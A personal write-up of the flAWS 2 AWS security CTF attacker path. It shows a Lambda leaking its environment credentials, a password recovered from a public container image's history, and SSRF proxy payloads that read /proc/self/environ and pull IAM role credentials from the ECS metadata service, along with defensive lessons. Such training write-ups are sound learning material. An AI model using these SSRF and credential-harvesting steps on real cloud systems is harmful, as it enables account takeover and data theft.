# flaws2.cloud.notes
Notes on flaws2.cloud

# Attacker

## Level 1 
For this level, you'll need to enter the correct PIN code. The correct PIN is 100 digits long, so brute forcing it won't help.

If we F12 in browser and checkout the code box: 
```
<form name="myForm" action="https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1" onsubmit="return validateForm()">
                Code: <input type="text" name="code" value="1234">
                <br><br>
                <input type="submit" value="Submit">
            </form>
```
Level 1 - Hint 1
The input validation is only done by the javascript. Get around it and pass a pin code that isn't a number.

So assuming we can just pass a parameter called 'code' in the querystring of the URL...

`https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=asdf`

```
Error, malformed input
{"AWS_LAMBDA_LOG_STREAM_NAME":"2021/10/31/[$LATEST]f4641b69990141bda581fc354e649d43","AWS_LAMBDA_FUNCTION_VERSION":"$LATEST","AWS_LAMBDA_INITIALIZATION_TYPE":"on-demand","LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib","_AWS_XRAY_DAEMON_PORT":"2000","AWS_XRAY_DAEMON_ADDRESS":"169.254.79.129:2000","_HANDLER":"index.handler","LAMBDA_TASK_ROOT":"/var/task","LAMBDA_RUNTIME_DIR":"/var/runtime","AWS_DEFAULT_REGION":"us-east-1","PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin","AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR","AWS_SESSION_TOKEN":"(redacted)","TZ":":UTC","AWS_SECRET_ACCESS_KEY":"(redacted)","AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1","AWS_LAMBDA_FUNCTION_NAME":"level1","AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128","AWS_LAMBDA_RUNTIME_API":"127.0.0.1:9001","AWS_REGION":"us-east-1","LANG":"en_US.UTF-8","_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.129","AWS_ACCESS_KEY_ID":"(redacted)","AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10","NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules","_X_AMZN_TRACE_ID":"Root=1-617de785-033bc97460b0f462069f764f;Parent=7c1db2d22904d0bc;Sampled=0"}
```

...we now have a key, secret key and token.

Add the instance profile keys and token to our local AWS credentials (~/.aws/credentials): 
```
[level1]
aws_access_key_id = (redacted)
aws_secret_access_key = (redacted)
aws_session_token = (redacted)
```

List files in the s3 bucket hosting the site

`aws --profile level1 s3 ls s3://level1.flaws2.cloud`

```
                           PRE img/
2018-11-20 15:55:05      17102 favicon.ico
2018-11-20 21:00:22       1905 hint1.htm
2018-11-20 21:00:22       2226 hint2.htm
2018-11-20 21:00:22       2536 hint3.htm
2018-11-20 21:00:23       2460 hint4.htm
2018-11-20 21:00:17       3000 index.htm
2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

Dump the secret file

`aws --profile level1 s3 cp s3://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html -`

```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta name="description" content="AWS Security training">
    <meta name="keywords" content="aws,security,ctf,amazon,enterprise,defense,infosec,cyber,flaws2">
    <title>flAWS2.cloud</title>

    <link href="http://flaws2.cloud/css/bootstrap.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Lato" rel="stylesheet">
    <link href="http://flaws2.cloud/css/summitroute.css" rel="stylesheet">

    <link rel="icon" href="/favicon.ico" sizes="16x16 32x32 64x64" type="image/vnd.microsoft.icon">
</head>

<body>
    <div class="stretchforfooter">
        <div class="container">
            <nav class="navbar navbar-default" role="navigation">
                <div class="navbar-header">
                    <a class="navbar-brand" href="/"></a>
                </div>
                <div>
                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <a href="http://flaws2.cloud" class="hvr-overline-from-center">flaws2.cloud</a>
                        </li>
                    </ul>
                </div>
            </nav>
        </div>

        <hr class="gradient">

        <div class="content-section-a">
          <div class="container">
    <div class="row">
        <div class="col-sm-8 col-sm-offset-2">

<div class="content">
    <div class="row">
        <div class="col-sm-12">
            <center><h1>Level 1 - Secret</h1></center>
            <hr>
            The next level is at <a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud">http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud</a>

        </div>
    </div>
</div>

</body>
</html>
```

Go to `http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud`

### Lessons Learned
```
Lambda obtains IAM credentials via env vars, so these should never be output, even for debug
```
```
Lambda IAM roles should follow least privilege principles
```
```
Lambda accepting user input should be treated like any website or web API, and client input should always be validated / not trusted
```

## Level 2

This next level is running as a container at http://container.target.flaws2.cloud/. Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".

Navigating to `http://container.target.flaws2.cloud/` gives me a prompt

From Level 1 to get the session token from Lambda: 

`https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=asdf`

```
Error, malformed input
{"AWS_EXECUTION_ENV":"AWS_Lambda_nodejs8.10","AWS_LAMBDA_FUNCTION_VERSION":"$LATEST","TZ":":UTC","AWS_XRAY_CONTEXT_MISSING":"LOG_ERROR","AWS_LAMBDA_INITIALIZATION_TYPE":"on-demand","LANG":"en_US.UTF-8","_AWS_XRAY_DAEMON_ADDRESS":"169.254.79.129","_AWS_XRAY_DAEMON_PORT":"2000","AWS_XRAY_DAEMON_ADDRESS":"169.254.79.129:2000","AWS_SESSION_TOKEN":"(redacted)","AWS_SECRET_ACCESS_KEY":"(redacted)","PATH":"/var/lang/bin:/usr/local/bin:/usr/bin/:/bin:/opt/bin","LD_LIBRARY_PATH":"/var/lang/lib:/lib64:/usr/lib64:/var/runtime:/var/runtime/lib:/var/task:/var/task/lib:/opt/lib","AWS_REGION":"us-east-1","AWS_LAMBDA_FUNCTION_MEMORY_SIZE":"128","AWS_LAMBDA_RUNTIME_API":"127.0.0.1:9001","LAMBDA_TASK_ROOT":"/var/task","LAMBDA_RUNTIME_DIR":"/var/runtime","_HANDLER":"index.handler","AWS_LAMBDA_FUNCTION_NAME":"level1","AWS_LAMBDA_LOG_GROUP_NAME":"/aws/lambda/level1","AWS_LAMBDA_LOG_STREAM_NAME":"2021/11/01/[$LATEST]9a85bbb4fe394550b6e3d643b2ba3fde","AWS_DEFAULT_REGION":"us-east-1","AWS_ACCESS_KEY_ID":"(redacted)","NODE_PATH":"/opt/nodejs/node8/node_modules:/opt/nodejs/node_modules:/var/runtime/node_modules:/var/runtime:/var/task:/var/runtime/node_modules","_X_AMZN_TRACE_ID":"Root=1-618042df-4cc9256160058c396472fc73;Parent=4da17ee132168ee7;Sampled=0"}
```

...we now have a key, secret key and token.

Add/update the instance profile keys and token to our local AWS credentials (~/.aws/credentials): 
```
[level1]
aws_access_key_id = (redacted)
aws_secret_access_key = (redacted)
aws_session_token = (redacted)
```

Find account ID: 

`aws --profile level1 sts get-caller-identity`

```
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

With the account we can now list the images (profile doesn't matter as the ECR repo is public):

`aws ecr list-images --repository-name level2 --registry-id 653711331788`

```
{
    "imageIds": [
        {
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTag": "latest"
        }
    ]
}
```

Login to ECR, pass the password to the docker command: 

`docker login -u AWS -p $(aws ecr get-login-password --profile level1 --region us-east-1) 653711331788.dkr.ecr.us-east-1.amazonaws.com`

```
WARNING! Using --password via the CLI is insecure. Use --password-stdin.
Login Succeeded
```

Pull the latest docker image from the ECR repo

`docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest`

```
latest: Pulling from level2
7b8b6451c85f: Pull complete
ab4d1096d9ba: Pull complete
e6797d1788ac: Pull complete
e25c5c290bde: Pull complete
96af0e137711: Pull complete
2057ef5841b5: Pull complete
e4206c7b02ec: Pull complete
501f2d39ea31: Pull complete
f90fb73d877d: Pull complete
4fbdfdaee9ae: Pull complete
Digest: sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e
Status: Downloaded newer image for 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest
```

List docker images 

`docker image ls`

```
REPOSITORY                                            TAG                 IMAGE ID            CREATED             SIZE 
653711331788.dkr.ecr.us-east-1.amazonaws.com/level2   latest              2d73de35b781        2 years ago         202MB
```

Show docker image history 

`docker history --no-trunc  2d73`

```
IMAGE                                                                     CREATED             CREATED BY
  SIZE                COMMENT
sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621   2 years ago         /bin/sh -c #(nop)  CMD ["sh" "/var/www/html/start.sh"]
  0B
<missing>                                                                 2 years ago         /bin/sh -c #(nop)  EXPOSE 80
  0B
<missing>                                                                 2 years ago         /bin/sh -c #(nop) ADD file:d29d68489f34ad71849687ac2eb66ceaee28315017d779fcfd5858423afee402 in /var/www/html/start.sh
  49B
<missing>                                                                 2 years ago         /bin/sh -c #(nop) ADD file:f8fd45be7a30bffa5ade2f6a47934c19f4fe1a1343e7229e7e730029f1730801 in /var/www/html/proxy.py
  614B
<missing>                                                                 2 years ago         /bin/sh -c #(nop) ADD file:fd3724e587d17e4bc8690d9febe596b4141f9e217111be51d530c5b55dfde646 in /var/www/html/index.htm
  1.89kB
<missing>                                                                 2 years ago         /bin/sh -c #(nop) ADD file:b311a5fa51887368e53012f2f31aafc46e999e44c238c9e2b23f47019f846acd in /etc/nginx/sites-available/default
  999B
<missing>                                                                 2 years ago         /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password
  45B
<missing>                                                                 2 years ago         /bin/sh -c apt-get update     && apt-get install -y nginx apache2-utils python    && apt-get clean     && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*     && echo "daemon off;" >> /etc/nginx/nginx.conf
  85.5MB
<missing>                                                                 2 years ago         /bin/sh -c #(nop)  CMD ["/bin/bash"]
  0B
<missing>                                                                 2 years ago         /bin/sh -c mkdir -p /run/systemd && echo 'docker' > /run/systemd/container
  7B
<missing>                                                                 2 years ago         /bin/sh -c rm -rf /var/lib/apt/lists/*
  0B
<missing>                                                                 2 years ago         /bin/sh -c set -xe   && echo '#!/bin/sh' > /usr/sbin/policy-rc.d  && echo 'exit 101' >> /usr/sbin/policy-rc.d  && chmod +x /usr/sbin/policy-rc.d   && dpkg-divert --local --rename --add /sbin/initctl  && cp -a /usr/sbin/policy-rc.d /sbin/initctl  && sed -i 's/^exit.*/exit 0/' /sbin/initctl   && echo 'force-unsafe-io' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup   && echo 'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };' > /etc/apt/apt.conf.d/docker-clean  && echo 'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };' >> /etc/apt/apt.conf.d/docker-clean  && echo 'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";' >> /etc/apt/apt.conf.d/docker-clean   && echo 'Acquire::Languages "none";' > /etc/apt/apt.conf.d/docker-no-languages   && echo 'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";' > /etc/apt/apt.conf.d/docker-gzip-indexes   && echo 'Apt::AutoRemove::SuggestsImportant "false";' > /etc/apt/apt.conf.d/docker-autoremove-suggests   745B
<missing>                                                                 2 years ago         /bin/sh -c #(nop) ADD file:efec03b785a78c01a6ade862d9a309f500ffa9f5f9314be26621f7fda0d5dfb8 in /
  116MB
```

We find the username and password in the history: 

`/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password`

Log into the container site, using username and password: 

```
Level 3
Read about Level 3 at level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
```

Navigate: level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud

### Lessons Learned

```
Some AWS services are a little more difficult to locate/abuse if public, but still shouldn't be public if not needed
```

```
Docker image history should be held to the same standards at git regarding accidental commits of secrets/sensitive data
```

## Level 3

Level 3 challenge
The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com

Need a hint?

Containers running via ECS on AWS have their creds at 169.254.170.2/v2/credentials/GUID where the GUID is found from an environment variable AWS_CONTAINER_CREDENTIALS_RELATIVE_URI

On Linux systems, the environmental variables for a process can often be found by looking in /proc/self/environ.

Use http://container.target.flaws2.cloud/proxy/file:///proc/self/environ and use the GUID found there to access something like http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/468f6417-4361-4690-894e-3d03a0394609 Use those creds to run aws s3 ls to list the buckets in the account.

Get the env var: 

`http://container.target.flaws2.cloud/proxy/file:///proc/self/environ`

```
HOSTNAME=ip-172-31-55-65.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/f536c20a-9a31-4f65-8f4e-0a201a72f7b0AWS_EXECUTION_ENV=AWS_ECS_FARGATEAWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/efd02f49-194c-477b-9fa5-2b408352ac1eECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/efd02f49-194c-477b-9fa5-2b408352ac1ePATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/
```

"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" GUID is `f536c20a-9a31-4f65-8f4e-0a201a72f7b0`

Get creds from ECS container: 

`http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/f536c20a-9a31-4f65-8f4e-0a201a72f7b0`

```
{"RoleArn":"arn:aws:iam::653711331788:role/level3","AccessKeyId":"(redacted)","SecretAccessKey":"(redacted)","Token":"(redacted)","Expiration":"2021-11-01T23:50:03Z"}
```

Add the ECS keys and token to our local AWS credentials (~/.aws/credentials): 
```
[level3]
aws_access_key_id = (redacted)
aws_secret_access_key = (redacted)
aws_session_token = (redacted)
```

Test profile: 

`aws sts get-caller-identity --profile level3`

```
{
    "UserId": "AROAJQMBDNUMIKLZKMF64:d66bbad377774eb8972ef0158bab4912",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/d66bbad377774eb8972ef0158bab4912"
}
```

List S3 buckets in account: 

`aws s3 ls --profile level3`

```
2018-11-20 14:50:08 flaws2.cloud
2018-11-20 13:45:26 level1.flaws2.cloud
2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud 
2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud 
2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

Go to http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud

### Lessons learned

```
ECS has sensitve environment variables and a metadata service which can lead to IAM role takeover/access creds
```
```
ECS IAM roles should be least privilege like everything else
```
```
A remote code exploit on ECS can lead to IAM role takeover/access creds 
```

## The End (attacker)

Congrats! You completed the attacker path of flAWS 2! There is also a defender path.

# Defender
